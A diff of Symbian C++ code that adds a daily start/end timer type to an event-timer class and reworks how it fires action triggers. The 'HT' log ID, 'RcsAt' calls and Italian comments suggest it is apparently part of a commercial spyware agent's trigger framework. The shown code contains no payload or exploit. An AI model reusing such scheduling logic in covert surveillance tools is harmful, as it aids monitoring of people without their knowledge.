@@ -11,13 +11,6 @@
 #include "EventTimer.h"
 #include <HT\TimeUtils.h>
 
-typedef struct TTimerStruct
-	{
-	TUint32 iType;
-	TUint32	iLoDelay;
-	TUint32	iHiDelay;
-	} TTimerStruct;
-
 	
 CEventTimer::CEventTimer(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_Timer, aTriggerId)
@@ -29,6 +22,7 @@ CEventTimer::~CEventTimer()
 	{
 	__FLOG(_L("Destructor"));
 	delete iTimer;
+	delete iEndTimer;
 	__FLOG(_L("End Destructor"));
 	__FLOG_CLOSE;
 	}
@@ -50,55 +44,116 @@ CEventTimer* CEventTimer::NewL(const TDesC8& params, TUint32 aTriggerId)
  
 void CEventTimer::ConstructL(const TDesC8& params)
 	{
-	//TUint32 addr = (TUint32) (this);
 	__FLOG_OPEN_ID("HT", "EventTimer.txt");
 	__FLOG(_L("-------------"));
 	
 	BaseConstructL(params);
 	iTimer = CTimeOutTimer::NewL(*this);
-	//TTimerStruct* timerParams = (TTimerStruct*)iParams.Ptr();	// crash on N96
-	TTimerStruct timerParams;
-	Mem::Copy( &timerParams, iParams.Ptr(), sizeof(TTimerStruct));
-	
-	TUint64 timeMillis = timerParams.iHiDelay;
-	timeMillis = timerParams.iHiDelay;
-	timeMillis <<= 32;
-	timeMillis += timerParams.iLoDelay;
-	iSecondsInterv = (timeMillis / 1000);
-	
-	iTimerType = (TTimerType) timerParams.iType;
+	iEndTimer = CTimeOutTimer::NewL(*this);
+	Mem::Copy( &iTimerParams, iParams.Ptr(), sizeof(TTimerStruct));
+		
+	iTimerType = (TTimerType) iTimerParams.iType;
 
-	if(iTimerType == Type_Date){
-		//iTimeAt = SetSymbianTime(timeMillis);
+	TUint64 timeMillis;
+	
+	if(iTimerType != Type_Daily)  // date, repeat, single
+		{
+		timeMillis = iTimerParams.iHiDelay;
+		timeMillis <<= 32;
+		timeMillis += iTimerParams.iLoDelay;
+		iSecondsInterv = (timeMillis / 1000);
+		}
+	else   // daily
+		{
+		//start
+		timeMillis = 0;
+		timeMillis += iTimerParams.iLoDelay;
+		iSecondsInterv = (timeMillis/1000);
+		//stop
+		timeMillis = 0;
+		timeMillis += iTimerParams.iHiDelay;
+		iEndSecondsInterv = (timeMillis/1000);
+		}
+	
+	if(iTimerType == Type_Date)
+		{
 		iTimeAt = TimeUtils::GetSymbianTime(timeMillis);
-	} else {
+		} 
+	else if(iTimerType == Type_Daily)
+		{
+		//daily: the milliseconds since midnight
+		iTimeAt.UniversalTime();
+		TDateTime date = iTimeAt.DateTime();
+		date.SetHour(0);
+		date.SetMinute(0);
+		date.SetSecond(0);
+		date.SetMicroSecond(0);
+		iTimeAt = date;
+		iTimeAt += iSecondsInterv;
+		
+		iEndTimeAt = date;
+		iEndTimeAt += iEndSecondsInterv;
+		}
+	else  // single, repeat
+		{
 		iTimeAt = (timeMillis*1000);
-	}
+		}
 	}
 
 void CEventTimer::StartEventL()
 	{
 	__FLOG(_L("StartEventL"));
 	__FLOG_2(_L("%d %d"), iTimerType, iSecondsInterv.Int());
-	if (iTimerType != Type_Date)
+	if((iTimerType==Type_Repeat) || (iTimerType==Type_Single) )
 		{
 		iTimeAt.HomeTime();
 		iTimeAt += iSecondsInterv;
 		iTimer->RcsAt(iTimeAt);
 		}
-	else {
+	else if(iTimerType==Type_Date)
+		{
 		// First we have to check if the date is expired
 		TTime now;
 		now.UniversalTime();
-		if (iTimeAt <= now){
+		if (iTimeAt <= now)
+			{
 			TTimeIntervalSeconds secondsInterv = 3;
 			iTimeAt.HomeTime();
 			iTimeAt += secondsInterv;
 			iTimer->RcsAt(iTimeAt);
-		} else {
+			} 
+		else 
+			{
 			iTimer->RcsAtUTC( iTimeAt );
+			}
 		}
-	}
+	else  //Type_Daily 
+		{
+		// what happens if timer daily already expired? at the moment is missed
+		TTime now;
+		now.UniversalTime();
+		if(iTimeAt <= now)
+			{
+			//already expired.... let's add 24 hours
+			TTimeIntervalHours hours = 24;
+			iTimeAt += hours;
+			iTimer->RcsAtUTC(iTimeAt);
+			}
+		else
+			{
+			iTimer->RcsAtUTC(iTimeAt);
+			}
+		if(iEndTimeAt <=now)
+			{
+			TTimeIntervalHours hours = 24;
+			iEndTimeAt += hours;
+			iEndTimer->RcsAtUTC(iEndTimeAt);
+			}
+		else
+			{
+			iEndTimer->RcsAtUTC(iEndTimeAt);
+			}
+		}
 	// Code below is useful for debugging purposes... 
 	// Uncomment to trigger the event after 1 second.
 /*
@@ -113,17 +168,37 @@ void CEventTimer::StartEventL()
 	}
 
 
-void CEventTimer::TimerExpiredL(TAny* /*src*/)
+void CEventTimer::TimerExpiredL(TAny* src)
 	{
 	__FLOG(_L("TimerExpiredL"));
-	SendActionTriggerToCoreL();
-	__FLOG(_L("EventSentL"));
 	if (iTimerType == Type_Repeat)
 		{
 		__FLOG(_L("After"));
 		iTimeAt.HomeTime();
 		iTimeAt += iSecondsInterv;
 		iTimer->RcsAt( iTimeAt );
+		SendActionTriggerToCoreL();
+		}
+	else if ((iTimerType == Type_Date) || (iTimerType == Type_Single))
+		{
+		SendActionTriggerToCoreL();
+		}
+	else //Type_Daily
+		{
+		TTimeIntervalHours hours(24);
+		if(src == iTimer)
+			{
+			//start action
+			iTimeAt += hours;
+			iTimer->RcsAtUTC(iTimeAt);
+			SendActionTriggerToCoreL();
+			}
+		else if(src == iEndTimer)
+			{
+			//end action
+			if (iTimerParams.iExitAction != 0xFFFFFFFF)						
+				SendActionTriggerToCoreL(iTimerParams.iExitAction);
+			}
 		}
 	}
 
@@ -133,23 +208,6 @@ void CEventTimer::TimerExpiredL(TAny* /*src*/)
  * Please also note that in defining KInitialTime the month and day values are offset from zero.
  * 
  */
-/*
-TInt64 CEventTimer::SetSymbianTime(TUint64 aFiletime)
-{
-
-	_LIT(KFiletimeInitialTime,"16010000:000000");
-
-	TTime initialFiletime;
-	initialFiletime.Set(KFiletimeInitialTime);
-
-	TInt64 interval;
-	interval = initialFiletime.Int64();
-
-	TInt64 date = aFiletime/10;
-
-	return (interval + date);
-}
-*/
 /*
  L'EventTimer, definito nel file di configurazione dal relativo EventId, triggera l'azione ad esso associata ad intervalli di tempo prestabiliti.
 
